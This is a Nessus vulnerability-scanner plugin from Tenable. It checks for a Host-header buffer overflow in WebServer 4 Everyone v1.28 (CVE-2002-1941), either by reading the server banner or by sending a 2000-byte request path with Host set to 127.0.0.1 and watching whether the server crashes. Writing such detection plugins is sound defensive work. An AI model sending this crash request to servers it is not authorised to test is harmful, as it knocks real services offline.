#
# (C) Tenable Network Security, Inc.
#

# Some vulnerable servers:
# WebServer 4 Everyone v1.28

# References:
# From:"Tamer Sahin" <ts@securityoffice.net>
# To:bugtraq@securityfocus.com
# Subject: [SecurityOffice] Web Server 4 Everyone v1.28 Host Field Denial of Service Vulnerability

include("compat.inc");

if(description)
{
 script_id(11167);
 script_version ("$Revision: 1.26 $");

 script_cve_id("CVE-2002-1941");
 script_bugtraq_id(6034);
 script_osvdb_id(59540);
 
 script_name(english:"WebServer 4 Everyone Host Field Header Buffer Overflow");
 script_summary(english:"Webserver4everyone too long URL with Host field set");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote web server is prone to a buffer overflow attack."
 );
 script_set_attribute(attribute:"description", value:
"The remote web server is running a version of WebServer 4 Everyone
that crashes when it receives a request for a long filename (2000
bytes) and the Host request header is set to '127.0.0.1'." );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://seclists.org/bugtraq/2002/Oct/340"
 );
 script_set_attribute(
  attribute:"solution", 
  value:"Unknown at this time."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/11/25");
 script_cvs_date("$Date: 2016/11/15 19:41:09 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK); # mixed
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencie("find_service1.nasl", "www_too_long_url.nasl", "http_version.nasl");
 script_require_ports("Services/www",80);
 script_exclude_keys("www/too_long_url_crash");
 script_require_keys("www/webserver4everyone");
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(safe_checks())
{ 
  b = get_http_banner(port: port);
  if (egrep(string: b, pattern: "WebServer 4 Everyone/1\.([01][0-9]?|2[0-8])"))
  {
    report = string(
     "\n",
     "Note that Nessus has determined the vulnerability exists based solely\n",
     "on the version returned in Server response headers."
    );
    security_warning(port:port, extra:report);
  }
  exit(0);
}

if(http_is_dead(port:port))exit(0);

w = http_send_recv3(
  method      : "GET", 
  port        : port,
  item        : "/" + crap(2000),
  add_headers : make_array("Host", "127.0.0.1"),
  version     : 11
);

if(http_is_dead(port: port))
{
  security_warning(port);
  set_kb_item(name:"www/too_long_url_crash", value:TRUE);
}
